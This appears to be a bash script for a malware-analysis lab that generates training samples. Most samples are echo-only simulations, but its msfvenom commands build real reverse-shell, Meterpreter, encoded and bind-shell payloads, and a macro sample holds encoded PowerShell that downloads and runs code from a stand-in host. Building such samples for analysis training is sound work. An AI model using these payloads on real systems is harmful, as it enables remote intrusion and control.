#!/bin/bash
# Educational Malware Sample Generator
# FOR EDUCATIONAL PURPOSES ONLY

echo "üéØ EDUCATIONAL MALWARE SAMPLE GENERATOR"
echo "========================================"
echo "‚ö†Ô∏è  FOR ANALYSIS TRAINING ONLY"
echo ""

# Configuration
SAMPLES_DIR="../samples/malicious/generated"
LOG_FILE="../logs/sample_generation.log"
TIMESTAMP=$(date +%Y%m%d_%H%M%S)

# Create samples directory
mkdir -p "$SAMPLES_DIR"
mkdir -p ../logs

# Logging function
log() {
    echo "[$(date +%Y-%m-%d_%H:%M:%S)] $1" | tee -a "$LOG_FILE"
}

# Safety check
safety_check() {
    log "Performing safety checks..."
    
    # Check if running in VM
    if ! systemd-detect-virt > /dev/null 2>&1; then
        log "WARNING: Not running in detected virtual environment"
        read -p "Continue anyway? (y/N): " -n 1 -r
        echo
        if [[ ! $REPLY =~ ^[Yy]$ ]]; then
            log "Operation cancelled by user"
            exit 1
        fi
    fi
    
    # Check network isolation
    log "Safety checks passed"
}

# Generate basic virus-like patterns
generate_simple_virus_pattern() {
    local filename="$1"
    local size="$2"
    
    log "Generating simple virus pattern: $filename"
    
    # Create file with suspicious patterns
    cat > "$filename" << EOF
#!/bin/bash
# Educational sample - harmless virus pattern
echo "This is an educational malware sample - harmless"

# Fake malicious behavior patterns
for i in {1..5}; do
    echo "Simulating malicious activity \$i"
    sleep 0.1
done

# Fake payload (base64 encoded harmless commands)
echo "U2ltdWxhdGluZyBtYWxpY2lvdXMgYmVoYXZpb3I=" | base64 -d
echo

# Fake persistence attempt
echo "Simulating persistence mechanism"
echo "exit 0" > /tmp/educational_sample

echo "Educational sample execution completed"
EOF
    
    chmod +x "$filename"
}

# Generate PE-style executable with msfvenom
generate_windows_samples() {
    log "Generating Windows educational samples..."
    
    if ! command -v msfvenom &> /dev/null; then
        log "msfvenom not available - skipping Windows samples"
        return
    fi
    
    local lhost="127.0.0.1"
    local lport="4444"
    
    # Simple reverse shell
    log "Generating Windows reverse shell sample"
    msfvenom -p windows/shell_reverse_tcp LHOST=$lhost LPORT=$lport -f exe \
        -o "${SAMPLES_DIR}/windows_reverse_shell_${TIMESTAMP}.exe" 2>/dev/null
    
    # Meterpreter sample
    log "Generating Windows Meterpreter sample"
    msfvenom -p windows/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -f exe \
        -o "${SAMPLES_DIR}/windows_meterpreter_${TIMESTAMP}.exe" 2>/dev/null
    
    # Encoded sample
    log "Generating encoded Windows sample"
    msfvenom -p windows/shell_reverse_tcp LHOST=$lhost LPORT=$lport -e x86/shikata_ga_nai -i 3 -f exe \
        -o "${SAMPLES_DIR}/windows_encoded_${TIMESTAMP}.exe" 2>/dev/null
}

# Generate Linux samples
generate_linux_samples() {
    log "Generating Linux educational samples..."
    
    if ! command -v msfvenom &> /dev/null; then
        log "msfvenom not available - skipping Linux samples"
        return
    fi
    
    local lhost="127.0.0.1"
    local lport="4444"
    
    # Linux reverse shell
    log "Generating Linux reverse shell sample"
    msfvenom -p linux/x86/shell_reverse_tcp LHOST=$lhost LPORT=$lport -f elf \
        -o "${SAMPLES_DIR}/linux_reverse_shell_${TIMESTAMP}.elf" 2>/dev/null
    
    # Linux bind shell
    log "Generating Linux bind shell sample"
    msfvenom -p linux/x86/shell_bind_tcp LPORT=$lport -f elf \
        -o "${SAMPLES_DIR}/linux_bind_shell_${TIMESTAMP}.elf" 2>/dev/null
}

# Generate document-based samples
generate_document_samples() {
    log "Generating document-based samples..."
    
    # Create fake malicious macro document (text representation)
    cat > "${SAMPLES_DIR}/suspicious_doc_${TIMESTAMP}.txt" << 'EOF'
FAKE MALICIOUS DOCUMENT SAMPLE - EDUCATIONAL PURPOSES

This file simulates a document with malicious macros:

Sub AutoOpen()
    ' Simulated malicious macro behavior
    Dim payload As String
    payload = "powershell -exec bypass -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AbQBhAGwAaQBjAGkAbwB1AHMALgBjAG8AbQAvAHAAYQB5AGwAbwBhAGQAJwApAA=="
    
    ' Simulated persistence
    CreateObject("WScript.Shell").Run payload, 0, False
End Sub

' Additional fake malicious functions
Sub Document_Open()
    AutoOpen
End Sub

This is for educational analysis only - completely harmless.
EOF

    # Create PDF with JavaScript simulation
    cat > "${SAMPLES_DIR}/suspicious_pdf_${TIMESTAMP}.txt" << 'EOF'
FAKE MALICIOUS PDF SAMPLE - EDUCATIONAL PURPOSES

Simulated PDF with embedded JavaScript:

/JavaScript <<
/JS (
    console.println("Simulated malicious PDF JavaScript");
    this.exportDataObject({
        cName: "/tmp/payload.exe",
        nLaunch: 2
    });
)
>>

Simulated embedded file:
<<
/Type /EmbeddedFile
/Subtype /application/octet-stream
/Length 100
>>
stream
FAKE_EXECUTABLE_CONTENT_HERE
endstream

This is for educational analysis only - completely harmless.
EOF
}

# Generate packed samples
generate_packed_samples() {
    log "Generating packed samples..."
    
    if ! command -v upx &> /dev/null; then
        log "UPX not available - skipping packed samples"
        return
    fi
    
    # Create a simple binary to pack
    cat > /tmp/simple_binary.c << 'EOF'
#include <stdio.h>
int main() {
    printf("Educational packed sample - harmless\n");
    return 0;
}
EOF
    
    # Compile and pack
    gcc /tmp/simple_binary.c -o "${SAMPLES_DIR}/simple_unpacked_${TIMESTAMP}.bin"
    upx -9 "${SAMPLES_DIR}/simple_unpacked_${TIMESTAMP}.bin" -o "${SAMPLES_DIR}/simple_packed_${TIMESTAMP}.bin" 2>/dev/null
    
    # Cleanup
    rm -f /tmp/simple_binary.c
}

# Generate network malware simulation
generate_network_samples() {
    log "Generating network behavior samples..."
    
    # Create script that simulates C2 communication
    cat > "${SAMPLES_DIR}/network_beacon_${TIMESTAMP}.sh" << 'EOF'
#!/bin/bash
# Educational network beacon simulation

echo "Simulating C2 beacon activity..."

# Fake configuration
C2_SERVER="http://192.168.1.100:8080"
BEACON_INTERVAL=5

for i in {1..3}; do
    echo "Beacon $i to $C2_SERVER"
    
    # Simulate data exfiltration
    echo "Simulating data upload..."
    sleep 1
    
    # Simulate command reception
    echo "Simulating command download..."
    sleep 1
    
    echo "Beacon $i completed"
    sleep $BEACON_INTERVAL
done

echo "Beacon simulation completed"
EOF

    chmod +x "${SAMPLES_DIR}/network_beacon_${TIMESTAMP}.sh"
}

# Generate ransomware simulation
generate_ransomware_simulation() {
    log "Generating ransomware simulation..."
    
    cat > "${SAMPLES_DIR}/ransomware_simulation_${TIMESTAMP}.sh" << 'EOF'
#!/bin/bash
# Educational ransomware simulation - COMPLETELY HARMLESS

echo "üîí EDUCATIONAL RANSOMWARE SIMULATION"
echo "===================================="
echo "THIS IS COMPLETELY HARMLESS - FOR TRAINING ONLY"
echo ""

# Fake encryption simulation
echo "Simulating file encryption..."
for i in {1..5}; do
    echo "Encrypting file_$i.txt -> file_$i.txt.encrypted"
    touch "/tmp/file_$i.txt.encrypted"
    sleep 0.5
done

# Fake ransom note
cat > "/tmp/README_RANSOM.txt" << EON
!!! YOUR FILES HAVE BEEN ENCRYPTED !!!

This is an educational simulation for malware analysis training.

No actual files have been encrypted.

For educational purposes only.

=== THIS IS A SIMULATION ===
EON

echo ""
echo "Ransom note placed: /tmp/README_RANSOM.txt"
echo "Simulation completed - no actual harm done"
EOF

    chmod +x "${SAMPLES_DIR}/ransomware_simulation_${TIMESTAMP}.sh"
}

# Generate sample information database
generate_sample_database() {
    log "Generating sample information database..."
    
    cat > "${SAMPLES_DIR}/sample_database_${TIMESTAMP}.csv" << EOF
filename,type,description,platform,risk_level,educational_value
windows_reverse_shell_${TIMESTAMP}.exe,trojan,Reverse shell backdoor,windows,medium,high
windows_meterpreter_${TIMESTAMP}.exe,trojan,Meterpreter payload,windows,medium,high
windows_encoded_${TIMESTAMP}.exe,trojan,Encoded malicious payload,windows,medium,high
linux_reverse_shell_${TIMESTAMP}.elf,trojan,Linux reverse shell,linux,medium,high
linux_bind_shell_${TIMESTAMP}.elf,trojan,Linux bind shell,linux,medium,high
suspicious_doc_${TIMESTAMP}.txt,document,Fake malicious document,cross-platform,low,medium
suspicious_pdf_${TIMESTAMP}.txt,document,Fake malicious PDF,cross-platform,low,medium
simple_packed_${TIMESTAMP}.bin,packed,UPX packed binary,linux,low,medium
network_beacon_${TIMESTAMP}.sh,script,Network beacon simulation,linux,low,high
ransomware_simulation_${TIMESTAMP}.sh,script,Ransomware simulation,linux,low,high
EOF
}

# Main generation function
main() {
    echo ""
    echo "üéØ GENERATING EDUCATIONAL MALWARE SAMPLES"
    echo "========================================="
    echo ""
    
    # Safety first
    safety_check
    
    log "Starting sample generation..."
    
    # Generate various sample types
    generate_simple_virus_pattern "${SAMPLES_DIR}/simple_virus_${TIMESTAMP}.sh" 1024
    generate_windows_samples
    generate_linux_samples
    generate_document_samples
    generate_packed_samples
    generate_network_samples
    generate_ransomware_simulation
    generate_sample_database
    
    # Generate hashes for all samples
    log "Generating file hashes..."
    find "$SAMPLES_DIR" -type f -exec sha256sum {} \; > "${SAMPLES_DIR}/hashes_${TIMESTAMP}.txt"
    
    # Final report
    local sample_count=$(find "$SAMPLES_DIR" -type f -name "*.exe" -o -name "*.elf" -o -name "*.sh" -o -name "*.txt" | wc -l)
    
    echo ""
    echo "‚úÖ SAMPLE GENERATION COMPLETED"
    echo "==============================="
    echo "üìÅ Samples generated: $sample_count"
    echo "üìç Location: $SAMPLES_DIR"
    echo "üìÑ Hashes file: ${SAMPLES_DIR}/hashes_${TIMESTAMP}.txt"
    echo "üìä Database: ${SAMPLES_DIR}/sample_database_${TIMESTAMP}.csv"
    echo ""
    echo "üéØ EDUCATIONAL USE ONLY"
    echo "‚ö†Ô∏è  These samples are for analysis training in controlled environments"
    echo ""
}

# Execute main function
main
